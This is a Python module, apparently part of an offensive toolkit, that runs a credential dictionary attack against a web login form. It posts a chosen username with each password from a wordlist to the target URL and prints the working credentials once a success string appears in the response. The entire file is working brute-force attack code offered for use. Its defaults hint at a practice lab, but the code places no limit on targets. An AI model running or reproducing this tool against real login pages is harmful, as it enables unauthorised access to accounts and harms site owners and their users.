#!/usr/bin/env python3
import os
import requests
from core.banner import info, success, warn, error, highlight, GREEN, RED, RESET, BRIGHT

def run(args):
    target_url = args.url
    if not target_url:
        error('Target login URL (-u / --url) is required.')
        return 1
    username = args.user or 'admin'
    success_str = args.success_str or 'You have logged in'
    user_field = args.user_field or 'username'
    pass_field = args.pass_field or 'password'
    wordlist_path = args.wordlist
    if not wordlist_path:
        default_wordlist = os.path.join(os.path.dirname(__file__), '..', 'post', 'passwords.txt')
        if os.path.exists(default_wordlist):
            wordlist_path = default_wordlist
        else:
            wordlist_path = 'passwords.txt'
    if not os.path.exists(wordlist_path):
        error(f'Password wordlist file not found: {wordlist_path}')
        return 1
    info(f'Target URL:        {target_url}')
    info(f'Target Username:   {username}')
    info(f'Password Wordlist: {wordlist_path}')
    info(f"Success Condition: '{success_str}' in response body")
    info('Starting credential dictionary attack...\n')
    attempts = 0
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                pwd = line.strip()
                if not pwd:
                    continue
                attempts += 1
                data_dict = {user_field: username, pass_field: pwd, 'Login': 'submit', 'submit': 'Submit'}
                try:
                    resp = requests.post(target_url, data=data_dict, timeout=5)
                    if success_str in resp.text:
                        print('\n' + '=' * 50)
                        print(f'{GREEN}{BRIGHT}[+] SUCCESS: Valid Credentials Found!{RESET}')
                        print(f'    Username: {username}')
                        print(f'    Password: {pwd}')
                        print(f'    Total Attempts: {attempts}')
                        print('=' * 50)
                        return 0
                except requests.exceptions.RequestException as e:
                    warn(f"Request error for password '{pwd}': {e}")
        warn(f'Completed {attempts} attempts. No valid password found in provided wordlist.')
        return 1
    except KeyboardInterrupt:
        warn('\nBrute-force attack interrupted by user.')
        return 130
